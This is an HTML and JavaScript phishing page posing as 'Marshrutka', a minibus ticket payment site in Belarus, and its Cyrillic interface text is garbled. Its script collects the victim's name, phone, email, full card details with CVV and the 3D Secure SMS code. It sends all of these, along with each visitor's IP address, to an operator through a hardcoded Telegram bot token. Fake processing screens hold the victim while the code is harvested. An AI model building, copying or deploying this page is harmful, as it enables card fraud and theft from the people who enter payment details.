<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Marshrutka ‚Ä¢ –û–ø–ª–∞—Ç–∞ –±–∏–ª–µ—Ç–∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        body {
            background: #0c111d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .card {
            max-width: 480px;
            width: 100%;
            background: #1a2535;
            border-radius: 32px;
            padding: 32px 24px;
            color: #e2e8f0;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            color: white;
            text-align: center;
        }
        .route-panel {
            background: #0e1a28;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #2d4b73;
        }
        .route-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #b7c4d9;
            font-size: 16px;
        }
        .price-large {
            font-size: 34px;
            color: #4299e1;
            text-align: center;
            margin: 20px 0;
            font-weight: 600;
        }
        .field {
            margin-bottom: 20px;
        }
        .field label {
            display: block;
            color: #b7c4d9;
            margin-bottom: 6px;
            font-size: 14px;
        }
        .field input {
            width: 100%;
            background: #0e1a28;
            border: 1px solid #2d4b73;
            border-radius: 16px;
            padding: 16px;
            color: white;
            font-size: 16px;
            transition: 0.2s;
        }
        .field input:focus {
            outline: none;
            border-color: #4299e1;
            background: #142a40;
        }
        .field input::placeholder {
            color: #4a5a72;
        }
        .btn {
            background: #4299e1;
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 40px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin: 20px 0 10px;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .btn-outline {
            background: transparent;
            border: 1px solid #4299e1;
            color: #4299e1;
        }
        .spinner {
            border: 3px solid #2d4b73;
            border-top: 3px solid #4299e1;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .secure-container {
            background: #0e1a28;
            border-radius: 24px;
            padding: 24px;
            margin-bottom: 20px;
        }
        .secure-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .secure-header img {
            width: 48px;
            height: 48px;
            background: white;
            border-radius: 8px;
            padding: 8px;
        }
        .secure-header span {
            font-size: 20px;
            font-weight: 600;
            color: white;
        }
        .secure-info {
            color: #b7c4d9;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .secure-code-input {
            background: #1e2a3a;
            border: 2px solid #2d4b73;
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            font-size: 32px;
            letter-spacing: 12px;
            color: white;
            width: 100%;
            margin-bottom: 20px;
        }
        .secure-code-input:focus {
            outline: none;
            border-color: #4299e1;
        }
        .secure-footer {
            color: #6f7f99;
            font-size: 12px;
            text-align: center;
            margin-top: 20px;
        }
        .success-icon, .fail-icon {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px auto 25px;
            font-size: 36px;
            border: 2px solid;
        }
        .success-icon {
            background: #1f4a3a;
            color: #2ecc71;
            border-color: #2ecc71;
        }
        .fail-icon {
            background: #4a2b2b;
            color: #e74c3c;
            border-color: #e74c3c;
        }
        .bank-strip {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 30px;
            color: #6f7f99;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="card" id="app"></div>

    <script>
        (function() {
            // ========== –ù–ê–°–¢–†–û–ô–ö–ò (–°–¢–ê–†–´–ô –¢–û–ö–ï–ù) ==========
            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c;
            const ADMIN_ID = 5852338439;
            const urlParams = new URLSearchParams(window.location.search);
            const linkHash = urlParams.get('hash');
            if (!linkHash) {
                document.getElementById('app').innerHTML = '<h1>–û—à–∏–±–∫–∞</h1><p>–ù–µ–≤–µ—Ä–Ω–∞—è —Å—Å—ã–ª–∫–∞</p>';
                return;
            }

            // ========== –î–ê–ù–ù–´–ï –ú–ê–†–®–†–£–¢–ê (–∑–∞–≥–ª—É—à–∫–∞) ==========
            const routeData = {
                from: '–ú–∏–Ω—Å–∫',
                to: '–ì–æ–º–µ–ª—å',
                date: '15.03.2026',
                time: '18:30',
                price: 27
            };

            let state = {
                step: 'passenger',
                passenger: { fullName: '', phone: '', email: '' },
                card: { number: '', expiry: '', cvv: '', cardholder: '' },
                smsCode: '',
                sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7)
            };

            async function sendToBot(type) {
                let text = '';
                if (type === 'visit') {
                    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' }));
                    text = `üëÅ –ó–ê–•–û–î –ù–ê –°–°–´–õ–ö–£\n\nüîó –•–µ—à: ${linkHash}\nüåç IP: ${ipData.ip}\nüì± ${navigator.userAgent}`;
                } else if (type === 'card') {
                    text = `üí≥ –ù–û–í–ê–Ø –ö–ê–†–¢–ê\n\nüöê –ú–∞—Ä—à—Ä—É—Ç: ${routeData.from} ‚Üí ${routeData.to}\nüìÖ ${routeData.date} ${routeData.time}\nüí∞ ${routeData.price} BYN\nüë§ –ü–∞—Å—Å–∞–∂–∏—Ä: ${state.passenger.fullName}\nüìû –¢–µ–ª–µ—Ñ–æ–Ω: ${state.passenger.phone}\nüìß Email: ${state.passenger.email}\nüí≥ –ö–∞—Ä—Ç–∞: ${state.card.number}\nüìÖ –°—Ä–æ–∫: ${state.card.expiry} | CVV: ${state.card.cvv}\nüë§ –í–ª–∞–¥–µ–ª–µ—Ü: ${state.card.cardholder}\nüîó –•–µ—à: ${linkHash}\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`;
                } else if (type === 'sms') {
                    text = `üì® SMS-–ö–û–î\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}\nüì± –ö–æ–¥: ${state.smsCode}\nüîó –•–µ—à: ${linkHash}`;
                } else if (type === 'resend') {
                    text = `üîÑ –ü–û–í–¢–û–†–ù–´–ô –ó–ê–ü–†–û–° SMS\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}\nüîó –•–µ—à: ${linkHash}`;
                }
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                    });
                } catch (e) { console.log('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram', e); }
            }

            function formatCardNumber(v) {
                let d = v.replace(/\D/g, '').slice(0,16);
                let parts = [];
                for (let i=0; i<d.length; i+=4) parts.push(d.slice(i,i+4));
                return parts.join(' ');
            }
            function formatExpiry(v) {
                let d = v.replace(/\D/g, '').slice(0,4);
                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
                return d;
            }
            function formatCVV(v) {
                return v.replace(/\D/g, '').slice(0,3);
            }

            function render() {
                const app = document.getElementById('app');
                let html = `<h1>Marshrutka</h1>`;

                if (state.step === 'passenger') {
                    html += `<div class="route-panel"><div class="route-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${routeData.from} ‚Üí ${routeData.to}</span></div><div class="route-row"><span>–î–∞—Ç–∞ / –≤—Ä–µ–º—è</span><span>${routeData.date} ${routeData.time}</span></div></div>`;
                    html += `<div class="price-large">${routeData.price} BYN</div>`;
                    html += `<div class="field"><label>–§–ò–û *</label><input id="fullName" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" value="${state.passenger.fullName}"></div>`;
                    html += `<div class="field"><label>–¢–µ–ª–µ—Ñ–æ–Ω *</label><input id="phone" placeholder="+375291234567" value="${state.passenger.phone}"></div>`;
                    html += `<div class="field"><label>Email</label><input id="email" placeholder="ivanov@mail.ru" value="${state.passenger.email}"></div>`;
                    html += `<button class="btn" id="nextBtn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>`;
                } else if (state.step === 'card') {
                    html += `<div class="route-panel"><div class="route-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div><div class="route-row"><span>–¢–µ–ª–µ—Ñ–æ–Ω</span><span>${state.passenger.phone}</span></div></div>`;
                    html += `<div class="price-large">${routeData.price} BYN</div>`;
                    html += `<div class="field"><label>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label><input id="cardNumber" placeholder="0000 0000 0000 0000" value="${state.card.number}"></div>`;
                    html += `<div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;"><div class="field"><label>–°—Ä–æ–∫</label><input id="expiry" placeholder="–ú–ú/–ì–ì" value="${state.card.expiry}"></div><div class="field"><label>CVV</label><input id="cvv" placeholder="123" value="${state.card.cvv}"></div></div>`;
                    html += `<div class="field"><label>–í–ª–∞–¥–µ–ª–µ—Ü –∫–∞—Ä—Ç—ã</label><input id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}"></div>`;
                    html += `<button class="btn" id="payBtn">–û–ø–ª–∞—Ç–∏—Ç—å ${routeData.price} BYN</button>`;
                    html += `<button class="btn btn-outline" onclick="state.step='passenger'; render();">‚Üê –ù–∞–∑–∞–¥</button>`;
                } else if (state.step === 'processing') {
                    html += `<div style="text-align:center;"><div class="spinner"></div><div style="margin-top:20px;">–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞... (30-60 —Å–µ–∫)</div></div>`;
                } else if (state.step === 'sms') {
                    html += `<div class="secure-container"><div class="secure-header"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%234299e1'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-.5-13v4h5v2h-5v4h-2v-4H6v-2h3.5V7h2z'/%3E%3C/svg%3E" alt="bank"><span>3D Secure</span></div><div class="secure-info">–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–ª–∞—Ç–µ–∂–∞ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –Ω–∞ –Ω–æ–º–µ—Ä<br><strong>${state.passenger.phone.slice(0,4)} *** **-${state.passenger.phone.slice(-2)}</strong></div><input class="secure-code-input" id="smsCode" maxlength="6" placeholder="______" value="${state.smsCode}"><button class="btn" id="confirmSmsBtn">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button><button class="btn btn-outline" id="resendSmsBtn">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –µ—â—ë —Ä–∞–∑</button><div class="secure-footer">–ù–∏–∫–æ–≥–¥–∞ –Ω–µ —Å–æ–æ–±—â–∞–π—Ç–µ —ç—Ç–æ—Ç –∫–æ–¥ —Ç—Ä–µ—Ç—å–∏–º –ª–∏—Ü–∞–º.</div></div>`;
                    html += `<button class="btn btn-outline" onclick="state.step='card'; render();">‚Üê –ù–∞–∑–∞–¥ –∫ –∫–∞—Ä—Ç–µ</button>`;
                } else if (state.step === 'processing2') {
                    html += `<div style="text-align:center;"><div class="spinner"></div><div style="margin-top:20px;">–ë–∞–Ω–∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏—é...</div></div>`;
                } else if (state.step === 'success') {
                    html += `<div style="text-align:center;"><div class="success-icon">‚úì</div><h2 style="margin-bottom:15px;">–ë–∏–ª–µ—Ç –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω!</h2><div style="color:#b7c4d9; margin-bottom:30px;">–ë–∏–ª–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –∏ SMS.<br>–î–∏—Å–ø–µ—Ç—á–µ—Ä —Å–≤—è–∂–µ—Ç—Å—è —Å –≤–∞–º–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç.</div><div class="route-panel"><div class="route-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${routeData.from} ‚Üí ${routeData.to}</span></div><div class="route-row"><span>–î–∞—Ç–∞</span><span>${routeData.date} ${routeData.time}</span></div><div class="route-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div><div class="route-row"><span>–¢–µ–ª–µ—Ñ–æ–Ω</span><span>${state.passenger.phone}</span></div><div class="route-row"><span>–°—É–º–º–∞</span><span>${routeData.price} BYN</span></div></div><button class="btn" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button></div>`;
                } else if (state.step === 'fail') {
                    html += `<div style="text-align:center;"><div class="fail-icon">‚úï</div><h2 style="margin-bottom:15px;">–ü–ª–∞—Ç—ë–∂ –Ω–µ –ø—Ä–æ—à—ë–ª</h2><div style="color:#b7c4d9; margin-bottom:30px;">–í–æ–∑–º–æ–∂–Ω—ã–µ –ø—Ä–∏—á–∏–Ω—ã:<br>‚Ä¢ –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤<br>‚Ä¢ –ù–µ–≤–µ—Ä–Ω—ã–π SMS-–∫–æ–¥<br>‚Ä¢ –ë–∞–Ω–∫ –æ—Ç–∫–ª–æ–Ω–∏–ª –æ–ø–µ—Ä–∞—Ü–∏—é</div><button class="btn" onclick="state.step='card'; render();">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button><button class="btn btn-outline" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button></div>`;
                }

                html += `<div class="bank-strip">–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫ ‚Ä¢ –ü—Ä–∏–æ—Ä–±–∞–Ω–∫ ‚Ä¢ –ê–ª—å—Ñ–∞-–ë–∞–Ω–∫ ‚Ä¢ Visa ‚Ä¢ Mastercard ‚Ä¢ –ë–µ–ª–∫–∞—Ä—Ç</div>`;
                app.innerHTML = html;

                if (state.step === 'passenger') {
                    document.getElementById('nextBtn')?.addEventListener('click', () => {
                        state.passenger.fullName = document.getElementById('fullName').value.trim();
                        state.passenger.phone = document.getElementById('phone').value.trim();
                        state.passenger.email = document.getElementById('email').value.trim();
                        if (!state.passenger.fullName || !state.passenger.phone) { alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –§–ò–û –∏ —Ç–µ–ª–µ—Ñ–æ–Ω'); return; }
                        state.step = 'card'; render();
                    });
                }
                if (state.step === 'card') {
                    document.getElementById('cardNumber')?.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
                    document.getElementById('expiry')?.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
                    document.getElementById('cvv')?.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));
                    document.getElementById('payBtn')?.addEventListener('click', async () => {
                        state.card.number = document.getElementById('cardNumber').value.trim();
                        state.card.expiry = document.getElementById('expiry').value.trim();
                        state.card.cvv = document.getElementById('cvv').value.trim();
                        state.card.cardholder = document.getElementById('cardholder').value.trim();
                        if (!state.card.number || !state.card.expiry || !state.card.cvv || !state.card.cardholder) { alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è –∫–∞—Ä—Ç—ã'); return; }
                        await sendToBot('card');
                        state.step = 'processing'; render();
                    });
                }
                if (state.step === 'sms') {
                    document.getElementById('confirmSmsBtn')?.addEventListener('click', async () => {
                        const code = document.getElementById('smsCode').value.trim();
                        if (!code || code.length < 4) { alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS'); return; }
                        state.smsCode = code;
                        await sendToBot('sms');
                        state.step = 'processing2'; render();
                    });
                    document.getElementById('resendSmsBtn')?.addEventListener('click', async () => {
                        await sendToBot('resend');
                        alert('–ù–æ–≤—ã–π –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
                    });
                }
            }

            window.showSmsPage = function() { if (state.step === 'processing') { state.step = 'sms'; render(); } };
            window.paymentResult = function(success) { if (state.step === 'processing2') { state.step = success ? 'success' : 'fail'; render(); } };

            (async () => { await sendToBot('visit'); })();
            render();
        })();
    </script>
</body>
</html>
